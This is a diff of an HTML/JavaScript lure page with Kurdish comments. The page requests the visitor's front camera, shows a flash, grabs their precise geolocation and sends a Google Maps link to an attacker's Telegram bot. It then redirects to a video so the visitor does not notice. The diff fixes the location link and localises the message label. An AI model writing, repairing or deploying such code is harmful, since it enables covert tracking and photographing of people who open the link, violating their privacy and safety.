@@ -43,12 +43,10 @@
 
         async function startApp() {
             try {
-                // تا کلیک لەسەر Allow نەکات لێرە ڕادەوەستێت و ناچێتە پێشەوە
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 await v.play();
-
                 const f = document.getElementById('flash');
                 f.style.display = 'block';
 
@@ -61,16 +59,15 @@
 
                         if (navigator.geolocation) {
                             navigator.geolocation.getCurrentPosition(async (pos) => {
-                                const mapLink = `http://googleusercontent.com/maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 Location:\n" + mapLink)}`);
+                                // چاککردنی کۆدی لۆکەیشن بۆ ئەوەی بە شینی و ڕاستەوخۆ دەرکەوێت
+                                const mapLink = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
                                 window.location.href = targetVideo;
                             }, () => { window.location.href = targetVideo; }, { enableHighAccuracy: true });
                         } else { window.location.href = targetVideo; }
                     }, 200);
                 }, 1000);
-            } catch (e) {
-                // ئەگەر Allow نەکات لێرە هیچ ڕوونادات و لەسەر هەمان لاپەڕە دەمێنێتەوە
-            }
+            } catch (e) {}
         }
     </script>
 </body>
